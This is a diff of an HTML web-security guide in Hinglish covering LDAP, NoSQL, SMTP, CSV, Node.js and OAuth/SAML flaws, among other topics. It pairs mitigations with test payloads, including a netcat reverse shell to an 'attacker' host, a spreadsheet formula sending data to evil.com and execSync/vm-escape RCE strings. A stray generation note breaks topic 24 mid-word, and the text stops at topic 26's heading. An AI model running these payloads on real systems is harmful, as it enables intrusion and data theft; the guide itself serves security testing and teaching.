+<li>Egress filtering (blind/OOB exfil roko) + WAF as defense-in-depth.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Ping/URL/hostname fields: <code>127.0.0.1; id</code>, <code>| whoami</code>, <code>&amp;&amp; uname -a</code>.</li>
+<li>Blind: <code>; sleep 5</code> — response delay? (time-based confirm).</li>
+<li>OOB: <code>; curl http://collab.oastify.com</code> — DNS/HTTP hit?</li>
+<li>Windows: <code>&amp; whoami</code>, <code>| dir</code>; encoded: <code>%3Bid</code>, <code>$()</code> variants.</li>
+<li>Escape bypass: <code>;echo${IFS}whoami</code>, <code>;c''at${IFS}/etc/passwd</code> (filter bypass).</li>
+<li>Error-based: <code>; cat /nonexistent</code> — error message output leak?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Network diagnostic tool (ping param) — <code>127.0.0.1; nc -e /bin/sh attacker 4444</code> se reverse shell → server compromise. Fix: remove shell usage, arg-array exec, allowlist.</div>
+</section>
+
+<section class="topic" id="t12">
+<h2><span class="n">12</span>LDAP Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>LDAP queries (directory services — AD, OpenLDAP) mein user input bina filter: <code>&amp;(uid=USER)(userPassword=PASS)</code> — injection chars: <code>*</code> (wildcard), <code>(</code>, <code>)</code>, <code>|</code>, <code>&amp;</code>, <code>!</code>. <b>Auth bypass:</b> <code>uid=*)(uid=*))(|(uid=*</code> ya <code>*</code> as password; <b>info disclosure:</b> boolean blind — <code>admin)(|(cn=*</code>, filter manipulation se attributes enumerate; <b>DoS</b> — complex filters. RFC 4515 escaping zaroori.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Authentication bypass on LDAP-based login (VPN, portals), directory enumeration (users, groups, emails), access control bypass — enterprise systems mein serious.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Escape LDAP special chars per RFC 4515 (<code>\2a \28 \29 \5c \00</code>).</li>
+<li>Parameterized LDAP APIs (bind variables) where available.</li>
+<li>Validate input: allowlist charset for usernames.</li>
+<li>Least privilege LDAP bind account (read-only, subtree-limited).</li>
+<li>Log + monitor LDAP query anomalies (WAF/IPS rules).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login: username <code>*</code>, password <code>*</code> — login hota hai? (wildcard bypass).</li>
+<li><code>admin)(|(password=*</code>, <code>admin)(&amp;</code> variants try karo.</li>
+<li>Boolean: <code>admin)(uid=*</code> vs <code>admin)(uid=x</code> — response differ?</li>
+<li>Enum: <code>*)(uid=*</code> in search field — saare users list?</li>
+<li>Error: <code>)(&amp;(&amp;</code> — LDAP error message aata hai? (info leak).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Corporate VPN login LDAP filter bina escape — <code>*</code> as password se attacker kisi bhi username par login kar gaya (first match). Fix: RFC 4515 escaping + MFA.</div>
+</section>
+
+<section class="topic" id="t13">
+<h2><span class="n">13</span>NoSQL Injection (MongoDB, Elasticsearch)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>NoSQL databases query operators accept karte hain: MongoDB JSON operators — <code>$ne</code> (not equal), <code>$gt</code> (greater), <code>$where</code> (JS execution), <code>$regex</code>, <code>$exists</code>. <b>Auth bypass:</b> <code>{"username":{"$ne":null},"password":{"$ne":null}}</code> — har user match; <code>{"password":{"$regex":".*"}}</code>. <b>Data extraction (blind):</b> <code>$regex</code> + boolean — character by character password guess. <b>JS injection:</b> <code>$where: "this.password == 'x'"</code> mein code exec (older MongoDB). Elasticsearch/Lucene: query string injection.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Auth bypass, full data extraction (blind regex), DoS (heavy queries), in legacy setups RCE via $where — modern NoSQL apps mein common.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate input TYPES strictly: username/password must be strings — reject objects/arrays.</li>
+<li>Never pass user JSON directly to query builder; use typed params.</li>
+<li>Disable <code>$where</code>/JS execution server-side (mongod <code>--noscripting</code>).</li>
+<li>Sanitize/whitelist operator usage; keep drivers patched.</li>
+<li>Least-privilege DB users + network isolation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login JSON: <code>{"username":{"$ne":null},"password":{"$ne":null}}</code> — bypass?</li>
+<li><code>{"$gt":""}</code> variants, <code>{"$regex":".*"}</code> — match hota hai?</li>
+<li>Blind extract: <code>{"$regex":"^a.*"}</code> vs <code>"^b.*"</code> — response diff? (char guess).</li>
+<li>Type confusion: string field par object bhejo — error/behavior?</li>
+<li>Elasticsearch: <code>?q=user:admin AND password:*</code> — query injection.</li>
+<li>Legacy: <code>$where: "sleep(5000)"</code> — delay? (JS exec test, careful).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Node.js app: login query <code>User.find({user: req.body.user, pass: req.body.pass})</code> — attacker ne <code>$ne</code> operators bheje → bina password login. Fix: typed validation + ORM param binding.</div>
+</section>
+
+<section class="topic" id="t14">
+<h2><span class="n">14</span>SMTP / Email Header Injection</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Email fields (To/Subject/From/Name) user-controlled aur CRLF injection possible: <code>%0d%0a</code> (<code>\r\n</code>) se naye headers add — <code>Bcc: victim@evil.com</code> (spam), <code>Reply-To:</code> (phishing), fake <code>From:</code> (spoofing), body injection (message content change). Contact forms, notification systems, password-reset emails mein common. Python <code>email</code> module / PHP <code>mail()</code> header params vulnerable. Detection: email field mein <code>%0d%0aBcc: attacker@evil.com</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Spam relay via your server (reputation damage, blacklist), phishing from trusted domain, recipient data leak (BCC), email spoofing.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate email fields strictly (RFC regex) — reject CR/LF characters.</li>
+<li>Use email libraries that escape header values (never raw header concat).</li>
+<li>Strip/encode <code>\r</code> <code>\n</code> from ALL user inputs in mail flows.</li>
+<li>Allowlist recipients — server-side fixed recipient for contact forms.</li>
+<li>SPF/DKIM/DMARC — spoofed mails rejected at receivers.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Name field: <code>victim%0d%0aBcc: attacker@evil.com</code> — BCC injected?</li>
+<li>Subject: <code>Hi%0d%0aReply-To: attacker@evil.com</code> — header override?</li>
+<li>Body injection: <code>%0d%0a%0d%0aFAKE MESSAGE</code> — body change hota hai?</li>
+<li>Send test email to your inbox — headers inspect karo (Received/To).</li>
+<li>SPF/DMARC: <code>dig TXT target.com</code> — spoof protection present?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Newsletter signup form — name field CRLF se Bcc injection → attacker ne 10k newsletter recipients ki emails khud ko bhejwaye (data leak + spam). Fix: header escaping + fixed sender.</div>
+</section>
+
+<section class="topic" id="t15">
+<h2><span class="n">15</span>HTTP Verb Tampering &amp; Method Override</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Server sirf kuch methods protect karta hai: GET/POST protected, lekin <b>PUT/DELETE/PATCH/OPTIONS/HEAD</b> unprotected ya alag behavior. <b>Method override:</b> <code>X-HTTP-Method-Override: DELETE</code>, <code>X-Method-Override</code>, <code>_method=DELETE</code> (Rails), <code>X-Original-URL</code>/<code>X-Rewrite-URL</code> (routing bypass) — WAF/framework routing confuse karke auth bypass. <b>Test:</b> har endpoint par saare methods try karo (OPTIONS se allowed methods dekho), override headers bhejo.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Auth bypass (admin functions via PUT), state changes via unexpected methods, WAF bypass (signatures sirf GET/POST dekhte hain), cache confusion.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Explicit method allowlist per route (405 for others).</li>
+<li>Disable/restrict method override headers at proxy level.</li>
+<li>Auth middleware method-agnostic — har method par same checks.</li>
+<li>Disable unused methods (WebDAV, TRACE, DEBUG).</li>
+<li>WAF rules cover all methods, not just GET/POST.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>OPTIONS: <code>curl -X OPTIONS https://target/api</code> — allowed methods list dekho.</li>
+<li>PUT/DELETE/PATCH on admin endpoints: <code>curl -X PUT -d '{"role":"admin"}'</code>.</li>
+<li>Override: <code>X-HTTP-Method-Override: DELETE</code>, <code>_method=DELETE</code> — action hota hai?</li>
+<li>X-Original-URL: <code>X-Original-URL: /admin</code> — routing bypass?</li>
+<li>TRACE: <code>curl -X TRACE</code> — XST (cross-site tracing) risk.</li>
+<li>HEAD on state-change endpoint — side effects hote hain?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Rails app: admin delete sirf DELETE par check karta tha, override header se POST se bypass hua → user delete ho gaya. Fix: method-agnostic auth + override header block.</div>
+</section>
+
+<section class="topic" id="t16">
+<h2><span class="n">16</span>CSV / Formula Injection (Spreadsheet Injection)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>App user data ko CSV/Excel export karta hai — field <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code> se start hota hai to Excel use formula samajh leta hai: <code>=cmd|'/C calc'!A0</code> (DDE), <code>=HYPERLINK("http://evil.com/?d="&amp;A1)</code> (data exfil), <code>=1+1</code> (formula exec), <code>@SUM(A1:A2)</code>. Victim export kholta hai → formula execute → local file read (DDE), external calls, malware download. SaaS reports/export features mein common.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE on victim's machine (DDE/old Excel), data exfiltration (HYPERLINK), phishing via crafted reports — High if exports are a feature.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Sanitize exported fields: prefix <code>'</code> (apostrophe) to formula-leading chars.</li>
+<li>Escape/encode <code>= + - @</code> at export time (server-side).</li>
+<li>Use CSV export libraries with formula injection protection.</li>
+<li>Disable DDE in Excel (org policy) + keep Excel patched (CVE-2017-0199 class).</li>
+<li>Validate input at entry too (allowlist) — defense in depth.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Username field: <code>=cmd|'/C calc'!A0</code> save karo → CSV export mein formula aata hai?</li>
+<li><code>=HYPERLINK("http://collab.oastify.com/"&amp;A1)</code> — victim open kare to Collaborator hit?</li>
+<li><code>+1+1</code>, <code>-1+1</code>, <code>@SUM(1+1)</code> variants test karo.</li>
+<li>Export file raw inspect: <code>=</code> wale fields unescaped hain?</li>
+<li>Excel open: formula calc hota hai ya plain text dikhta hai? (patched Excel behavior).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Admin panel user export — attacker ne username <code>=HYPERLINK(...)</code> banaya → admin ne CSV khola → attacker ke server par internal data exfil. Fix: apostrophe prefix + DDE disabled.</div>
+</section>
+
+<section class="topic" id="t17">
+<h2><span class="n">17</span>Server-Side JS Injection (Node.js) &amp; Eval Risks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Node.js app user input ko <code>eval()</code>, <code>new Function()</code>, <code>vm.runInNewContext()</code> (sandbox escape), template engines, ya <code>child_process</code> mein daalta hai. Payloads: <code>process.mainModule.require('child_process').execSync('id')</code>, <code>global.process.mainModule.constructor._load('child_process').execSync('id')</code>, vm escape: <code>this.constructor.constructor('return process')()</code>. Prototype pollution (Part 1 topic 29) se bhi RCE chains (child_process options pollution). Detection: input mein <code>1+1</code> / <code>process.version</code> reflect hota hai?</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE as node user, file read (fs), network pivot — Critical. eval in any form = code injection surface.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>NEVER eval/Function on user input; use safe parsers (JSON.parse with schema).</li>
+<li>vm module is NOT a security sandbox — use real sandboxes (isolated VMs/containers) if needed.</li>
+<li>Disable <code>child_process</code> in untrusted contexts; restrict with allowlists.</li>
+<li>Prototype pollution fixes (Part 1 topic 29) — key validation, Object.create(null).</li>
+<li>Dependency patching (SCA) — vulnerable express/ejs versions.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>process.version</code> daalo — Node version reflect hota hai? (JS exec proof).</li>
+<li><code>require('child_process').execSync('id').toString()</code> — command output?</li>
+<li>vm escape: <code>this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')</code>.</li>
+<li>Template injection: <code>&lt;%= 7*7 %&gt;</code>, <code>${7*7}</code> (EJS/Handlebars).</li>
+<li>Prototype pollution → RCE: <code>{"__proto__":{"shell":"/bin/sh","argv0":"x","NODE_OPTIONS":"--require /proc/self/environ"}}</code> (advanced).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Math-expression calculator feature mein eval() — <code>process.mainModule.require('child_process').execSync('id')</code> se RCE → server par reverse shell. Fix: safe expression parser + no eval.</div>
+</section>
+
+<!-- ==================== AUTHN / AUTHZ / SESSION ==================== -->
+<h3 class="category">AuthN / AuthZ / Session</h3>
+
+<section class="topic" id="t18">
+<h2><span class="n">18</span>Authentication Flaws — Full Checklist</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OWASP A07: <b>1. weak passwords</b> (no policy/breached passwords), <b>2. no MFA</b>, <b>3. user enumeration</b> (different errors/timing), <b>4. brute force/credential stuffing</b> (no rate limit), <b>5. insecure password storage</b> (MD5/plaintext), <b>6. session flaws</b> (predictable IDs, no rotation/expiry), <b>7. OTP/2FA bypass</b> (Part 1 topic 32), <b>8. password reset flaws</b> (topic 21), <b>9. default credentials</b>, <b>10. remember-me flaws</b> (weak token), <b>11. insecure auth protocols</b> (basic/digest over HTTP), <b>12. cookie security flags missing</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Account takeover, credential stuffing at scale, data breach via compromised accounts — auth flaws = entry to everything.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>MFA (TOTP/WebAuthn) — stolen passwords useless.</li>
+<li>Argon2id/bcrypt storage + breached-password check (haveibeenpwned API).</li>
+<li>Rate limit + lockout + CAPTCHA escalation (Part 1 topic 37).</li>
+<li>Uniform errors + timing (enumeration roko); session rotation/expiry.</li>
+<li>Secure cookies (HttpOnly/Secure/SameSite) + HTTPS only.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Enum: "user not found" vs "wrong password" — messages differ?</li>
+<li>Brute: Intruder 100 attempts — rate limit/lockout aata hai?</li>
+<li>Storage: DB dump/decompile — hash format check (MD5? unsalted?).</li>
+<li>Remember-me: cookie predictable/static? expiry?</li>
+<li>Default creds: admin/admin, test/test, root/toor.</li>
+<li>MFA: OTP bypass suite (Part 1 topic 32).</li>
+<li>Session: ID rotation on login; logout invalidation.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce: no MFA + no rate limit + weak hash → credential stuffing se 5k accounts compromised → gift card fraud. Fix: MFA + rate limit + Argon2 + breach check.</div>
+</section>
+
+<section class="topic" id="t19">
+<h2><span class="n">19</span>Authorization Flaws — Full Checklist</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OWASP A01 (most critical): <b>1. IDOR/BOLA</b> (object access without ownership check), <b>2. BFLA</b> (function-level — user calls admin API), <b>3. missing function-level checks</b>, <b>4. forced browsing</b> (hidden URLs accessible), <b>5. privilege escalation</b> (role tamper, JWT claims), <b>6. path traversal</b>, <b>7. CORS misconfig</b> (cross-origin data read), <b>8. mass assignment</b> (role/isAdmin fields), <b>9. insecure direct method calls</b> (internal APIs), <b>10. authorization on GET only</b> (POST/DELETE unchecked), <b>11. client-side authz only</b> (UI hiding, not server checks).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data breach (mass PII), account takeover, admin compromise — #1 web app vulnerability category per OWASP.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Server-side authorization on EVERY request (object + function level).</li>
+<li>Deny-by-default; role/permission middleware per endpoint.</li>
+<li>Test with multiple roles/accounts (horizontal + vertical).</li>
+<li>Never trust client-supplied roles/flags — derive from session/DB.</li>
+<li>Audit access logs + anomaly detection.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Two-account test: User A ke token se User B ke resources (IDOR).</li>
+<li>Role swap: normal token → admin endpoints (BFLA) — every method.</li>
+<li>Forced browsing: /admin, /internal, /backup direct hit.</li>
+<li>JWT claim tamper: role/user in token modify (Part 1 topic 33).</li>
+<li>Mass assignment: isAdmin/role fields in body (Part 1 topic 25).</li>
+<li>Method variation: GET protected? DELETE/PUT unprotected?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Social app: GET /api/chat/:id protected tha, DELETE unprotected — attacker ne delete API call karke doosre users ke chats delete kiye. Fix: object-level check on all methods.</div>
+</section>
+
+<section class="topic" id="t20">
+<h2><span class="n">20</span>Session Management — Deep Dive</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Session lifecycle issues: <b>1. predictable IDs</b> (timestamp/sequential/counter — Sequencer test), <b>2. no rotation on login/privilege change</b> (fixation), <b>3. no expiry</b> (idle + absolute), <b>4. no logout invalidation</b> (server-side session alive), <b>5. concurrent session policy</b> (no limit/notification), <b>6. token in URL</b> (referer leak), <b>7. weak cookie attributes</b> (no HttpOnly/Secure/SameSite), <b>8. session storage</b> (localStorage JWT), <b>9. session fixation via subdomain cookie injection</b>, <b>10. no binding</b> (device/UA/IP fingerprint absent), <b>11. session not invalidated on password change</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Session hijacking/fixation → ATO; stale sessions → shared-device compromise; predictable IDs → mass session theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>CSPRNG 128-bit+ session IDs; rotate on login/logout/privilege change.</li>
+<li>Idle (15-30 min) + absolute expiry; invalidate server-side.</li>
+<li>HttpOnly + Secure + SameSite cookies; never in URL.</li>
+<li>Invalidate sessions on password change; optional device binding + alerts.</li>
+<li>Session store: Redis with TTL; horizontal scale with sticky sessions/central store.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Sequencer: 100 session IDs — randomness weak? (Burp Sequencer).</li>
+<li>Rotation: login ke baad ID change hota hai? (fixation test).</li>
+<li>Expiry: session 1hr idle — expire hota hai? absolute timeout?</li>
+<li>Logout: purana cookie reuse — valid hai? (server invalidation).</li>
+<li>URL token: <code>?sessionid=</code> accept hota hai? referer leak test.</li>
+<li>Password change: purane sessions kill hote hain?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Session ID timestamp+username based tha — Burp Sequencer se predictability confirmed → attacker ne IDs generate karke active sessions hijack kiye. Fix: CSPRNG + rotation + expiry.</div>
+</section>
+
+<section class="topic" id="t21">
+<h2><span class="n">21</span>Password Reset Flaws</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Reset flow attacks: <b>1. token in URL</b> (referer/log leak), <b>2. predictable token</b> (timestamp/email hash/sequential), <b>3. no expiry</b> (old token valid), <b>4. multi-use token</b>, <b>5. user enumeration</b> (reset response differs), <b>6. Host header poisoning</b> (link attacker domain — Part 1 topic 23), <b>7. account takeover via reset of another user</b> (IDOR in reset param), <b>8. response manipulation</b> (step skip), <b>9. race condition</b> (parallel reset), <b>10. no rate limit on token attempts</b> (brute 4-6 digit codes), <b>11. token not bound to session/device</b>, <b>12. reset doesn't invalidate old sessions</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Complete account takeover — reset flow = highest-value target in auth testing.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Token: CSPRNG 128-bit, single-use, short expiry, hashed at rest.</li>
+<li>Host header validation + server-generated links (Part 1 topic 23).</li>
+<li>Bind token to user+session; rate limit attempts + lockout.</li>
+<li>Uniform responses (no enumeration); invalidate all sessions on reset.</li>
+<li>Re-auth after reset for sensitive actions; log + alert resets.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Token in email: link contains token? (referer leak risk).</li>
+<li>Predictable: token pattern check (base64 of email? timestamp?).</li>
+<li>Reuse: same token do baar — second time valid?</li>
+<li>Expiry: 2 din purana token — ab bhi kaam karta hai?</li>
+<li>Enum: valid vs invalid email response differ? timing differ?</li>
+<li>Host header: <code>Host: evil.com</code> se reset link generate — attacker domain par jaata hai?</li>
+<li>IDOR: reset param mein doosre user ka id/token — account change hota hai?</li>
+<li>Rate limit: token attempt brute (4-6 digit codes) — lockout hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Reset token = MD5(email+timestamp) tha — attacker ne token generate karke victim ka password reset kiya. Fix: CSPRNG + expiry + hashed storage + session invalidation.</div>
+</section>
+
+<section class="topic" id="t22">
+<h2><span class="n">22</span>OAuth 2.0 Grant Types — Deep Dive &amp; Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Grant types: <b>1. Authorization Code</b> — redirect_uri + code → token (SPA/native: + PKCE mandatory); <b>2. Implicit</b> (deprecated) — token in redirect URL (leak-prone); <b>3. Client Credentials</b> — server-to-server, no user (secret exposure risk); <b>4. ROPC</b> (deprecated) — username/password direct (credential harvesting surface); <b>5. Device Flow</b> — smart TVs (polling, user code brute). <b>Attacks per flow:</b> redirect_uri manipulation, code/token interception (open redirect), CSRF on callback (no state), PKCE missing (native apps), client secret leak, token scope confusion, mix-up attack (multiple IdPs), authorization code replay.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Access token theft → victim's data in connected apps; account takeover via OAuth login chains.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Authorization Code + PKCE everywhere; kill implicit/ROPC.</li>
+<li>Strict exact-match redirect_uri allowlist; block open redirects.</li>
+<li>state (CSRF) + nonce (OIDC) + code binding to client.</li>
+<li>Short-lived tokens + refresh rotation + scopes least privilege.</li>
+<li>Validate all tokens server-side (signature, iss, aud, exp).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>redirect_uri: <code>https://evil.com</code>, <code>https://app.com.evil.com</code>, prefix match test.</li>
+<li>Open redirect chain: redirect_uri → app ka redirect → token wahan leak?</li>
+<li>state: callback bina state — login CSRF possible?</li>
+<li>PKCE: code_verifier missing — native app flow vulnerable?</li>
+<li>Client secret: APK/JS mein hardcoded? (topic 38 Part 1).</li>
+<li>Code replay: ek code do baar exchange — accept? (binding check).</li>
+<li>Scope: token scope modify karke — server validate karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>OAuth client redirect_uri prefix-matched — <code>https://app.com.evil.com</code> se victim ka code intercept → token → Google contacts leak. Fix: exact match + PKCE + state.</div>
+</section>
+
+<section class="topic" id="t23">
+<h2><span class="n">23</span>SSO &amp; SAML Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SAML = XML-based SSO (IdP issues signed assertion → SP trusts). <b>Attacks:</b> <b>1. XML signature wrapping</b> (XSW) — signed block untouched, malicious block add karke auth bypass; <b>2. assertion tampering</b> (no/weak signature validation) — change NameID/roles; <b>3. token replay</b> (no NotOnOrAfter/session binding); <b>4. IdP confusion</b> (attacker-controlled IdP assertion); <b>5. XML external entity</b> in assertions; <b>6. audience/recipient validation missing</b> (assertion doosre SP par use); <b>7. logout/ACS endpoint issues</b>. Same class applies to WS-Fed, JWT-based SSO (OIDC) with different formats.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>SSO bypass = admin access across ALL integrated apps — enterprise-wide compromise.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Validate XML signature strictly (canonicalization + enveloped signature rules).</li>
+<li>Validate assertion: issuer, audience, recipient, NotBefore/NotOnOrAfter, SubjectConfirmation.</li>
+<li>Bind assertions to session/one-time use (replay roko).</li>
+<li>Patch SAML libraries (many XSW CVEs); disable external entities.</li>
+<li>Test with saml-raider/saml-proxy style tools before release.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Tamper: assertion mein NameID/role change karke re-encode — SP accept karta hai? (unsigned?).</li>
+<li>XSW: signature block ko copy karke malicious assertion wrap karo (Burp + saml tools).</li>
+<li>Replay: same assertion do baar POST ACS — second time accepted?</li>
+<li>Audience: doosre SP ka audience wala assertion use karo.</li>
+<li>XXE: assertion mein <code>&lt;!ENTITY&gt;</code> — file read test.</li>
+<li>Expiry: NotOnOrAfter past/future modify karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Enterprise SSO: SAML signature validation missing — attacker ne assertion mein role=admin set kiya → saare SaaS apps par admin access. Fix: strict signature + claims validation.</div>
+</section>
+
+<section class="topic" id="t24">
+<h2><span class="n">24</span>BAC (Broken Access Control) — A01 Deep Dive</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OWASP A01 2021 — sabse critical category. Includes: <b>IDOR/BOLA</b>, <b>BFLA</b>, <b>missing auth on endpoints</b>, <b>privilege escalation</b> (role tamper, JWT), <b>path traversal</b>, <b>forced browsing</b>, <b>CORS misconfig</b>, <b>mass assignment</b>, <b>method tampering</b>, <b>cache of sensitive pages</b>, <b>client-side access control only</b>, <b>insecure direct object references in APIs</b>. Root cause: authorization checks missing/incorrect/order wrong (Part 1 topic 10) — den
+Continuing topic 24 and completing topics 25–50, then closing the document.
+
+```html
+<div class="def"><span class="lbl ld">Definition</span><br>y-by-default server-side enforcement nahi hai. Interview answer framework: "Access control flaws ka matlab hai — server har request par object-level aur function-level authorization verify nahi karta; client ko trust karta hai."</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data breach, ATO, admin compromise — OWASP data: 34%+ of apps mein access control issues; sabse common critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Deny-by-default middleware; object ownership + role checks on EVERY endpoint.</li>
+<li>Server-side decisions only — never client-supplied roles/flags.</li>
+<li>UUIDs (defense) + reference maps; generic 403/404 (no enumeration).</li>
+<li>Automated tests: two-role matrix (A/B user, user/admin) in CI.</li>
+<li>Audit logs + anomaly detection on access patterns.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Full endpoint map: har endpoint bina auth + with normal user + with admin.</li>
+<li>Object-level: /api/orders/1..N with User A token (IDOR matrix).</li>
+<li>Function-level: user token → /api/admin/* (BFLA).</li>
+<li>JWT/params: role/user/group claims tamper.</li>
+<li>CORS: evil origin — credentials data read (Part 1 topic 4).</li>
+<li>Mass assignment: isAdmin, verified, balance fields.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview answer: "Sabse critical finding — Broken Access Control: normal user token se admin user-management API callable tha (BFLA) + order ID iteration se 10k customers ka PII (IDOR). Ek hi root cause: server-side authz missing. Fix + retest."</div>
+</section>
+
+<!-- ==================== WEB PLATFORM & ADVANCED ==================== -->
+<h3 class="category">Web Platform &amp; Advanced</h3>
+
+<section class="topic" id="t25">
+<h2><span class="n">25</span>Web Cache Poisoning &amp; Web Cache Deception</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Cache poisoning:</b> cache key mein na hone wale inputs (unkeyed headers/params) response content change karte hain — attacker <code>X-Forwarded-Host: evil.com</code> se page mein evil URLs inject karta hai → cache store → sab users ko poisoned page. Also: unkeyed cookie, unkeyed query, normalization confusion, fat GET. <b>Cache deception:</b> attacker victim ko cacheable URL par le jaata hai jo sensitive data render karta hai (<code>/account/profile.css</code>, <code>/account/nonexistent</code>) — CDN cache mein private data store ho jaata hai → attacker cached copy fetch karta hai. Detection: cache headers (<code>X-Cache</code>, <code>Age</code>, <code>CDN-Cache</code>), unkeyed input reflect test, second request se cache hit check.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Mass XSS (poisoning — one request, all users), private data theft (deception), defacement, DoS (poisoned 404s).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Cache key mein SAARE response-affecting inputs include karo (Vary properly).</li>
+<li>Never cache personalized/authenticated responses (<code>Cache-Control: private/no-store</code>).</li>
+<li>Ignore/validate unkeyed headers (X-Forwarded-Host allowlist).</li>
+<li>Use allowlist caching: sirf static endpoints cache karo.</li>
+<li>Reject requests with unexpected Content-Type on cached routes (deception fix).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Cache headers detect: <code>X-Cache: HIT</code>, <code>Age</code>, <code>CDN-Cache</code>.</li>
+<li>Unkeyed param: <code>/page?cachebuster=1</code> vs <code>?x=evil</code> — response differ + cached?</li>
+<li>Unkeyed header: <code>X-Forwarded-Host: evil.com</code> — poisoned content cache hota hai?</li>
+<li>Deception: <code>/account/settings.css</code> — private data cacheable? phir bina cookie fetch karo.</li>
+<li>Normalization: <code>/page%2f..%2faccount</code> — path confusion cache.</li>
+<li>Second request (no attack input): poisoned content serve hota hai? (cache hit).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>CDN ne unkeyed <code>X-Forwarded-Host</code> reflect kiya — attacker ne homepage poison kiya → 1M users ko malicious JS serve hua (mass XSS). Fix: cache allowlist + host validation.</div>
+</section>
+
+<section class="topic" id="t26">
+<h2><span class="n">26</span>HTTP Request Smuggling — All Variants (CL.TE, TE.CL, TE.TE, HTTP/2)</h2>
